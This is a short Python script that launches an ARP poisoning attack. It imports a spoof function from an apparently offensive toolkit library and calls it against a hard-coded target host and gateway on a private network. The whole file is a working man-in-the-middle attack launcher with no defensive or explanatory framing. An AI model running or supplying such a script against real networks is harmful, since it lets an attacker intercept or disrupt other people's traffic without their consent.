import sys
from AGOTK import arp_poisoning

INTERFACE: str = 'en0' #'enp0s3'

def main(argv) -> None:
    ip_target: str = '192.168.200.1' # 19
    ip_gateway: str = '192.168.200.254'
    arp_poisoning.spoof(ip_target, ip_gateway, True, INTERFACE, 10)

if __name__ == "__main__":
    main(sys.argv[1:])